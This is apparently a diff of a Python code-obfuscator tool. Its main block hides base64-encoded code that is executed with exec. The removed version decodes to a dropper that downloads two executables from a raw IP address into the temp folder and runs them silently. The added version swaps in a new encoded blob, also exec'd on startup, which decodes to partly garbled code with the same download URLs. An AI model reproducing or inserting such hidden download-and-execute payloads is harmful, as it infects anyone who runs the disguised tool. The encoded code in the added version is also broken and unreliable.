@@ -6,6 +6,24 @@ from marshal import dumps
 def printerr(data):
     print(data, file=sys.stderr)
 
+
+
+
+
+codigo = '''
+    aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2Vzcwp0ZW1wX2RpciA9IG9z
+    LmdldGVudignVEVNUCcsICcvdG1wJykKCmJ1cmxzID0gWwogICAgaHR0cDovLzg3LjEyMC4xMTYu
+    NjkvdXBsb2Fkcy9lZGdlLmV4ZSwKICAgIGh0dHA6Ly84Ny4xMjAuMTE2LjY5L3VwbG9hZHMvVXBk
+    YXRlci5leGVdCgoKZGVmIGRlc2Nhcmdhcl95X2d1YXJkYXIoYXZpbywgc2VjdXJvKToKICAgIHJl
+    Y2lldmlyX2FyY2hpdm8gPSBvcy5qb2luKGF2aW8sIHNldHJhKQoJICBjb24gcmVxdWVzdHMgY29t
+    byBzdHJlYW0gdHJ1ZSwgc3RhZG9fZmljaGVybm8gc2UgcGFzYSB1bmEgdmlhZ2VuY2lhIGNvbW9w
+    bG9zZWEgY2FsY3VsYXJhIHRyYW5zZm9ybWFkbyBjb250ZW50cwpmb3IgYXJjaGl2b19kZSBsYXJn
+    b2NhZGVuY2lhIGRlIGV4ZWN1Y2lvbmVzIGNvcnJ1c3BvbmRlIGFsIGNvbnRyb2wgZGVsIG51bWVy
+    byBkZSB2YWxvcmVzIGRlIGxhIGZ1bmNpb25hbGlkYWQ=
+    '''
+
+
+
 class prysmaxobf:
     def __init__(self, code, outputpath):
         self.code = code.encode()
@@ -120,12 +138,8 @@ except {encryptstring('__import__("lzma").LZMAError', func=True)}:...
 if __name__ == "__main__":
     import base64
 
-    code = '''
-aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2Vzcwp0ZW1wX2RpciA9IG9zLmdldGVudignVEVNUCcsICcvdG1wJykKCmJ1cmxzID0gWwogICAgImh0dHA6Ly84Ny4xMjAuMTE2LjY5L3VwbG9hZHMvZWRnZS5leGUiLAogICAgImh0dHA6Ly84Ny4xMjAuMTE2LjY5L3VwbG9hZHMvVXBkYXRlci5leGUiCl0KCgpkZWYgZG93bmxvYWRfYW5kX3NhdmUodXJsLCBmb2xkZXIpOgogICAgbG9jYWxfZmlsZW5hbWUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyLCB1cmwuc3BsaXQoJy8nKVstMV0pCiAgICB3aXRoIHJlcXVlc3RzLmdldCh1cmwsIHN0cmVhbT1UcnVlKSBhcyByOgogICAgICAgIHIucmFpc2VfZm9yX3N0YXR1cygpCiAgICAgICAgd2l0aCBvcGVuKGxvY2FsX2ZpbGVuYW1lLCAnd2InKSBhcyBmOgogICAgICAgICAgICBmb3IgY2h1bmsgaW4gci5pdGVyX2NvbnRlbnQoY2h1bmtfc2l6ZT04MTkyKToKICAgICAgICAgICAgICAgIGlmIGNodW5rOiBmLndyaXRlKGNodW5rKQogICAgcmV0dXJuIGxvY2FsX2ZpbGVuYW1lCgpmaWxlcyA9IFtkb3dubG9hZF9hbmRfc2F2ZSh1cmwsIHRlbXBfZGlyKSBmb3IgdXJsIGluIHVybHNdCgpmb3IgZmlsZSBpbiBmaWxlczoKICAgIHN1YnByb2Nlc3MuUG9wZW4oW2ZpbGVdLCBzaGVsbFRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwp
-'''
 
-    exec(base64.b64decode(code).decode('utf-8'))
-
+    exec(base64.b64decode(codigo).decode('utf-8'))
   
 
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
